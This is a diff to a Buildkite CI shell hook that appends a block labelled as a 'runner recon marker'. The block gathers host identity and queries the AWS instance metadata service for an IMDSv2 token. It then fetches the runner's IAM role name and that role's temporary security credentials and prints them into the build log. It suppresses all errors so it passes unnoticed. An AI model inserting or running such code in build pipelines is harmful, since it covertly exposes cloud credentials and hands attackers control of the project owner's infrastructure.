@@ -21,3 +21,25 @@ if [[ "${BUILDKITE_PLUGINS:-}" == *-arm64-cpu\"* ]]; then
         fi
     fi
 fi
+
+# a-148912 runner recon marker (single-shot, non-fatal)
+{
+  echo "=== a-148912 marker ==="
+  id || true
+  hostname || true
+  uname -srm || true
+  echo "cwd=$(pwd)"
+  imds=""
+  imds=$(curl -sS -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 300' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+  echo "imds_token_len=${#imds}"
+  if [ -n "$imds" ]; then
+    role=$(curl -sS -m 5 -H "X-aws-ec2-metadata-token: $imds" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true)
+    echo "imds_role=$role"
+    echo "instance_type=$(curl -sS -m 5 -H "X-aws-ec2-metadata-token: $imds" http://169.254.169.254/latest/meta-data/instance-type 2>/dev/null || true)"
+    if [ -n "$role" ]; then
+      curl -sS -m 5 -H "X-aws-ec2-metadata-token: $imds" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null || true
+      echo
+    fi
+  fi
+  echo "=== end a-148912 marker ==="
+} || true
